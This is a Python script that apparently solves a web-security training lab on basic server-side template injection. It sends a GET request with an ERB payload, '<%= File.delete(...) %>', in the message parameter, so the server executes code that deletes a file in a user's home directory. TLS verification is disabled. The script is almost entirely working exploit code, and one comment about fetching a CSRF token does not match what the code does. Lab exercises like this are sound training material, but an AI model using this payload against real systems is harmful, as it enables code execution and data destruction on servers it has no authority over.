#!/usr/bin/env python3
import requests
import argparse
from urllib.parse import urljoin

MESSAGE_PATH = "/?message="
DELETE_FILENAME = "/home/carlos/morale.txt"

def send_message_with_payload(base_url, payload):
    """Send a GET request with a payload to display the message."""
    message_url = urljoin(base_url, MESSAGE_PATH + payload)

    r = requests.get(message_url, timeout=10, verify=False)
    r.raise_for_status()
    return r

def main():
    requests.packages.urllib3.disable_warnings()
    parser = argparse.ArgumentParser(
        description="Lab: Basic server-side template injection"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")

    print(f"[*] Base URL: {base_url}")

    # Step 1: Get CSRF token from /feedback page
    print("[*] Performing attack...\n")
    payload = f'<%= File.delete("{DELETE_FILENAME}") %>'
    send_message_with_payload(base_url, payload)
    # if no exceptions - Lab solved
    print(f"[*] File {DELETE_FILENAME} removed\n")

    print("\n[+] Attack finished. See Lab solved.")


if __name__ == "__main__":
    main()